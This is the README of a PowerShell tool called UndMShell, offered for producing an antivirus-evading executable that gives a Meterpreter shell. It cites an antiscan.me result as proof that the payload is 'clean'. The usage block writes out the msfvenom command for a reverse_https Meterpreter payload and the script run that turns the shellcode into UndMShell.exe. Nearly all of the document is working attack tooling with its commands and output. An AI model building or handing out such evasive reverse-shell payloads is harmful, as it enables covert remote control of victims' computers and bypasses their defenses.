# UndMShell
**UndMShell** is a tool to generate a [clean payload](https://antiscan.me/scan/new/result?id=uKE1Uhhi9drE) to get a Meterpreter shell.

Check the result below -7/10/2021-.

![enter image description here](https://antiscan.me/images/result/uKE1Uhhi9drE.png)

### Installation
```
 1. Run powersehll as Administrator
 2. Install-Module ps2exe
```

###  Usage
```
PS C:\> # First, you need to generate a shellcode from Msfvenom and save it into txt file.
PS C:\> # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=443 EXITFUNC=thread -f ps1
PS C:\> # Then run the script.
PS C:\> .\UndMShell.ps1 shellcode.txt UndMShell.exe
[-] UndMShell v0.1 | Coded by Abdullah AlZahrani | GitHub.com/0xAbdullah
- Your shellcode file: shellcode.txt
- Something is cooking, wait.
- Your payload is ready: UndMShell.exe
```
